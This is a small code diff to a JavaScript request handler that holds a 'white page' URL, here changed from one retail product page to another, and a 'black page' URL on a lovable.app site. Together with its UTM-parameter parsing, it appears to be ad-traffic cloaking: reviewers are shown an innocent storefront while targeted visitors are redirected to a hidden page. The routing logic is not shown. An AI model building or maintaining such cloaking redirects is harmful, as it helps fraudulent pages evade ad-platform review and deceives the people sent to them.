@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://frenchpharmacy.com/products/mustela-nourishing-milk-with-cold-cream-for-dry-skin?variant=43491658760418";
+    const whitePageURL = "https://wlidaty.com/en/products/bebesafe-barriere-de-securite-blanc";
     const blackPageURL = "https://casssshlov.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
